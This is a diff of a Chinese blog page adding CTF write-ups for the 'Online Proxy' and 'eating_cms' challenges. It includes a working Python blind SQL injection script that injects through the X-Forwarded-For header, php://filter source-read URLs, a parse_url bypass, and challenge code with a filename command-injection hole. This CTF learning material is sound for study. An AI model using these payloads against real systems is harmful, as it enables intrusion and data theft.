@@ -481,21 +481,21 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-19
+                    2022-04-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    14.9k
+                    17k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    70 分
+                    82 分
                 </div>
                 
 
@@ -2059,6 +2059,373 @@ echo serialize($a);</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184421898.png"></p>
 <p>而<code>0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code>是<code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code>的十六进制形式，因为文件名不允许存在双引号，\0是因为我们的序列化的两个属性都是protected类型的，而在储存时对protected序列化后出现的不可见字符与*的组合进行了替换，将chr(0)*chr(0)替换为了\0\0\0，在反序列化时又换了回去，为了程序的执行，所以我们要将其替换</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184018967.png" alt="image-20220419184018967"></p>
+<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>一道像ssrf的页面，但实际上是xff头的二次注入</p>
+<pre class="language-none"><code class="language-none">我们测试一下，先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or &#39;1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203914643.png" alt="image-20220420203914643"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203921117.png" alt="image-20220420203921117"></p>
+<p>所以直接跑脚本就行了</p>
+<pre class="language-none"><code class="language-none">import requests
+
+url &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:28996&#x2F;&#39;
+flag &#x3D; &#39;&#39;
+for i in range(1, 100):
+    length &#x3D; len(flag)
+    min &#x3D; 32
+    max &#x3D; 125
+    while 1:
+        j &#x3D; min + (max - min) &#x2F;&#x2F; 2
+        if min &#x3D;&#x3D; j:
+            flag +&#x3D; chr(j)
+            print(flag)
+            break
+        # 爆表
+        # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j)
+        # 爆库
+        payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&lt;%d or &#39;0&quot;%(i,j)
+        # 爆列
+        # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j)
+        # 爆flag
+        #payload1 &#x3D; &quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&lt;%d or &#39;0&quot; % (i, j)
+        payload2 &#x3D; &quot;1&quot;
+        headers &#x3D; &#123;&quot;x-forwarded-for&quot;: payload1,
+                   &#39;Cookie&#39;: &#39;track_uuid&#x3D;585aabec-e6df-4724-95b8-8c2fa1285f61&#39;&#125;
+        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text
+        # print(r)
+        headers[&quot;x-forwarded-for&quot;] &#x3D; payload2
+        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text
+        # print(r)
+        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text
+        # print(r)
+        location &#x3D; r.find(&quot;Last Ip: &quot;)
+        number &#x3D; r[location + 9:location + 10]
+        if &#39;1&#39; in number:
+            max &#x3D; j
+        else:
+            min &#x3D; j</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204220118.png" alt="image-20220420204220118"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204313445.png" alt="image-20220420204313445"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204518414.png" alt="image-20220420204518414"></p>
+<p>最后出flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420205247558.png" alt="image-20220420205247558"></p>
+<p>赵总怎么还在里边夹私货（</p>
+<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>有注册界面register.php</p>
+<p>注册一下登录之后感觉有点像伪协议</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421201110247.png" alt="image-20220421201110247"></p>
+<p>试一下，成功读到了源码</p>
+<pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user #不知道为什么加上.php就读不到了</code></pre>
+
+<p>解码</p>
+<p>user.php</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+require_once(&quot;function.php&quot;);
+if( !isset( $_SESSION[&#39;user&#39;] ))&#123;
+    Header(&quot;Location: index.php&quot;);
+
+&#125;
+if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;
+    $oper_you_can_do &#x3D; $OPERATE_admin;
+&#125;else&#123;
+    $oper_you_can_do &#x3D; $OPERATE;
+&#125;
+&#x2F;&#x2F;die($_SESSION[&#39;isadmin&#39;]);
+if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;
+    if(!isset($_GET[&#39;page&#39;]) || $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123;
+        $page &#x3D; &#39;info&#39;;
+    &#125;else &#123;
+        $page &#x3D; $_GET[&#39;page&#39;];
+    &#125;
+&#125;
+else&#123;
+    if(!isset($_GET[&#39;page&#39;])|| $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123;
+        $page &#x3D; &#39;guest&#39;;
+    &#125;else &#123;
+        $page &#x3D; $_GET[&#39;page&#39;];
+        if($page &#x3D;&#x3D;&#x3D; &#39;info&#39;)
+        &#123;
+&#x2F;&#x2F;            echo(&quot;&lt;script&gt;alert(&#39;no premission to visit info, only admin can, you are guest&#39;)&lt;&#x2F;script&gt;&quot;);
+            Header(&quot;Location: user.php?page&#x3D;guest&quot;);
+        &#125;
+    &#125;
+&#125;
+filter_directory();
+&#x2F;&#x2F;if(!in_array($page,$oper_you_can_do))&#123;
+&#x2F;&#x2F;    $page &#x3D; &#39;info&#39;;
+&#x2F;&#x2F;&#125;
+include &quot;$page.php&quot;;
+?&gt;</code></pre>
+
+<p>function.php</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+session_start();
+require_once &quot;config.php&quot;;
+function Hacker()
+&#123;
+    Header(&quot;Location: hacker.php&quot;);
+    die();
+&#125;
+
+
+function filter_directory()
+&#123;
+    $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];
+    $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]);
+    parse_str($uri[&#39;query&#39;], $query);
+&#x2F;&#x2F;    var_dump($query);
+&#x2F;&#x2F;    die();
+    foreach($keywords as $token)
+    &#123;
+        foreach($query as $k &#x3D;&gt; $v)
+        &#123;
+            if (stristr($k, $token))
+                hacker();
+            if (stristr($v, $token))
+                hacker();
+        &#125;
+    &#125;
+&#125;
+
+function filter_directory_guest()
+&#123;
+    $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;];
+    $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]);
+    parse_str($uri[&#39;query&#39;], $query);
+&#x2F;&#x2F;    var_dump($query);
+&#x2F;&#x2F;    die();
+    foreach($keywords as $token)
+    &#123;
+        foreach($query as $k &#x3D;&gt; $v)
+        &#123;
+            if (stristr($k, $token))
+                hacker();
+            if (stristr($v, $token))
+                hacker();
+        &#125;
+    &#125;
+&#125;
+
+function Filter($string)
+&#123;
+    global $mysqli;
+    $blacklist &#x3D; &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;;
+    $whitelist &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*&#96;-@&#x3D;+&gt;&lt;&quot;;
+    for ($i &#x3D; 0; $i &lt; strlen($string); $i++) &#123;
+        if (strpos(&quot;$whitelist&quot;, $string[$i]) &#x3D;&#x3D;&#x3D; false) &#123;
+            Hacker();
+        &#125;
+    &#125;
+    if (preg_match(&quot;&#x2F;$blacklist&#x2F;is&quot;, $string)) &#123;
+        Hacker();
+    &#125;
+    if (is_string($string)) &#123;
+        return $mysqli-&gt;real_escape_string($string);
+    &#125; else &#123;
+        return &quot;&quot;;
+    &#125;
+&#125;
+
+function sql_query($sql_query)
+&#123;
+    global $mysqli;
+    $res &#x3D; $mysqli-&gt;query($sql_query);
+    return $res;
+&#125;
+
+function login($user, $pass)
+&#123;
+    $user &#x3D; Filter($user);
+    $pass &#x3D; md5($pass);
+    $sql &#x3D; &quot;select * from &#96;albert_users&#96; where &#96;username_which_you_do_not_know&#96;&#x3D; &#39;$user&#39; and &#96;password_which_you_do_not_know_too&#96; &#x3D; &#39;$pass&#39;&quot;;
+    echo $sql;
+    $res &#x3D; sql_query($sql);
+&#x2F;&#x2F;    var_dump($res);
+&#x2F;&#x2F;    die();
+    if ($res-&gt;num_rows) &#123;
+        $data &#x3D; $res-&gt;fetch_array();
+        $_SESSION[&#39;user&#39;] &#x3D; $data[username_which_you_do_not_know];
+        $_SESSION[&#39;login&#39;] &#x3D; 1;
+        $_SESSION[&#39;isadmin&#39;] &#x3D; $data[isadmin_which_you_do_not_know_too_too];
+        return true;
+    &#125; else &#123;
+        return false;
+    &#125;
+    return;
+&#125;
+
+function updateadmin($level,$user)
+&#123;
+    $sql &#x3D; &quot;update &#96;albert_users&#96; set &#96;isadmin_which_you_do_not_know_too_too&#96; &#x3D; &#39;$level&#39; where &#96;username_which_you_do_not_know&#96;&#x3D;&#39;$user&#39; &quot;;
+    echo $sql;
+    $res &#x3D; sql_query($sql);
+&#x2F;&#x2F;    var_dump($res);
+&#x2F;&#x2F;    die();
+&#x2F;&#x2F;    die($res);
+    if ($res &#x3D;&#x3D; 1) &#123;
+        return true;
+    &#125; else &#123;
+        return false;
+    &#125;
+    return;
+&#125;
+
+function register($user, $pass)
+&#123;
+    global $mysqli;
+    $user &#x3D; Filter($user);
+    $pass &#x3D; md5($pass);
+    $sql &#x3D; &quot;insert into &#96;albert_users&#96;(&#96;username_which_you_do_not_know&#96;,&#96;password_which_you_do_not_know_too&#96;,&#96;isadmin_which_you_do_not_know_too_too&#96;) VALUES (&#39;$user&#39;,&#39;$pass&#39;,&#39;0&#39;)&quot;;
+    $res &#x3D; sql_query($sql);
+    return $mysqli-&gt;insert_id;
+&#125;
+
+function logout()
+&#123;
+    session_destroy();
+    Header(&quot;Location: index.php&quot;);
+&#125;
+
+?&gt;</code></pre>
+
+<p>这里有个<strong>parse_url的解析漏洞</strong>（我记得我遇见过，但是不知道为什么没有写在wp上</p>
+<pre class="language-php" data-language="php"><code class="language-php">$url0 &#x3D; &quot;&#x2F;baidu.com:80&quot;;&#x2F;&#x2F;全版本通杀，当url没协议时parse_url会直接报错
+$url &#x3D; &quot;httpsadasd:&#x2F;&#x2F;www.baidu.com:80?a&#x3D;123&quot;;
+$url1 &#x3D; &quot;&#x2F;baidu.com:80a&quot;;&#x2F;&#x2F;但是在端口上加上字母就能正常解析
+$url2 &#x3D; &quot;&#x2F;&#x2F;pupiles.com&#x2F;about:1234&quot;;&#x2F;&#x2F;这是php5.5以上的一个端口解析漏洞，这样的url会将&#x2F;后的内容都path看作path
+$url3 &#x3D; &quot;&#x2F;&#x2F;baidu.com:80a&quot;;
+
+
+var_dump(parse_url($url0));
+var_dump(parse_url($url));
+var_dump(parse_url($url1));
+var_dump(parse_url($url2));
+var_dump(parse_url($url3));</code></pre>
+
+<p>返回的内容为</p>
+<pre class="language-php" data-language="php"><code class="language-php">bool(false)
+array(4) &#123;
+  [&quot;scheme&quot;]&#x3D;&gt;
+  string(10) &quot;httpsadasd&quot;
+  [&quot;host&quot;]&#x3D;&gt;
+  string(13) &quot;www.baidu.com&quot;
+  [&quot;port&quot;]&#x3D;&gt;
+  int(80)
+  [&quot;query&quot;]&#x3D;&gt;
+  string(5) &quot;a&#x3D;123&quot;
+&#125;
+array(1) &#123;
+  [&quot;path&quot;]&#x3D;&gt;
+  string(14) &quot;&#x2F;baidu.com:80a&quot;
+&#125;
+array(3) &#123;
+  [&quot;host&quot;]&#x3D;&gt;
+  string(11) &quot;pupiles.com&quot;
+  [&quot;port&quot;]&#x3D;&gt;
+  int(1234)
+  [&quot;path&quot;]&#x3D;&gt;
+  string(11) &quot;&#x2F;about:1234&quot;
+&#125;
+array(2) &#123;
+  [&quot;host&quot;]&#x3D;&gt;
+  string(9) &quot;baidu.com&quot;
+  [&quot;port&quot;]&#x3D;&gt;
+  int(80)
+&#125;</code></pre>
+
+<p>测试</p>
+<pre class="language-php" data-language="php"><code class="language-php">$url4 &#x3D; &quot;&#x2F;&#x2F;upload?&#x2F;test&#x2F;&quot;;
+$url5 &#x3D; &quot;&#x2F;upload?&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;;
+$url6 &#x3D; &quot;&#x2F;&#x2F;&#x2F;upload?id&#x3D;1&quot;;
+
+
+var_dump(parse_url($url4));
+var_dump(parse_url($url5));
+var_dump(parse_url($url6));</code></pre>
+
+<p>返回的内容为</p>
+<pre class="language-php" data-language="php"><code class="language-php">array(2) &#123;
+  [&quot;host&quot;]&#x3D;&gt;
+  string(7) &quot;upload?&quot;
+  [&quot;path&quot;]&#x3D;&gt;
+  string(6) &quot;&#x2F;test&#x2F;&quot;
+&#125;
+array(2) &#123;
+  [&quot;path&quot;]&#x3D;&gt;
+  string(7) &quot;&#x2F;upload&quot;
+  [&quot;query&quot;]&#x3D;&gt;
+  string(9) &quot;&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;
+&#125;
+bool(false)</code></pre>
+
+<p>这个就是我们需要的路径解析漏洞，这个在php的不同版本差别还是挺大的</p>
+<p>5.2在参数带个伪协议直接解析不了。。。而且好像也没有这个洞和///直接报错的洞</p>
+<p>5.4，5.5可以直接利用这个漏洞绕过</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220117699.png" alt="image-20220421220117699"></p>
+<p>但是7.0开始好像是对参数里的：和/进行了检测</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220326012.png" alt="image-20220421220326012"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220436590.png" alt="image-20220421220436590"></p>
+<p>然后我们可以用</p>
+<pre class="language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg
+或
+&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg</code></pre>
+
+<p>读到ffffllllaaaaggg里的内容</p>
+<p>解码之后</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+if (FLAG_SIG !&#x3D; 1)&#123;
+    die(&quot;you can not visit it directly&quot;);
+&#125;else &#123;
+    echo &quot;you can find sth in m4aaannngggeee&quot;;
+&#125;
+?&gt;</code></pre>
+
+<p>那就再看m4aaannngggeee</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+if (FLAG_SIG !&#x3D; 1)&#123;
+    die(&quot;you can not visit it directly&quot;);
+&#125;
+include &quot;templates&#x2F;upload.html&quot;;
+
+?&gt;</code></pre>
+
+<p>访问一下包含的这个文件</p>
+<p>是个文件上传的页面</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421221443724.png" alt="image-20220421221443724"></p>
+<p>但是没法传，但是跳转到了一个新的页面，再用伪协议读一下</p>
+<p>upllloadddd.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+$allowtype &#x3D; array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);
+$size &#x3D; 10000000;
+$path &#x3D; &quot;.&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;;
+$filename &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];
+if(is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]))&#123;
+    if(!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.$filename))&#123;
+        die(&quot;error:can not move&quot;);
+    &#125;
+&#125;else&#123;
+    die(&quot;error:not an upload file！&quot;);
+&#125;
+$newfile &#x3D; $path.$filename;
+echo &quot;file upload success&lt;br &#x2F;&gt;&quot;;
+echo $filename;
+$picdata &#x3D; system(&quot;cat .&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;.$filename.&quot; | base64 -w 0&quot;);
+echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;png;base64,&quot;.$picdata.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;
+if($_FILES[&#39;file&#39;][&#39;error&#39;]&gt;0)&#123;
+    unlink($newfile);
+    die(&quot;Upload file error: &quot;);
+&#125;
+$ext &#x3D; array_pop(explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]));
+if(!in_array($ext,$allowtype))&#123;
+    unlink($newfile);
+&#125;
+?&gt;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421222040731.png" alt="image-20220421222040731"></p>
+<p>看这句，如果我们再filename出插入命令，就可以执行它</p>
+<p>那我们就去找真正的文件上传的页面，想到之前的m4aaannngggeee</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421225045605.png" alt="image-20220421225045605"></p>
+<p>利用分号执行多个注释，然后利用井号注释掉后面的语句</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421224821554.png" alt="image-20220421224821554"></p>
 
                 
             </div>
@@ -2848,7 +3215,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">94.7k</span>
+                        class="white-color">102.3k</span>
             
             
             
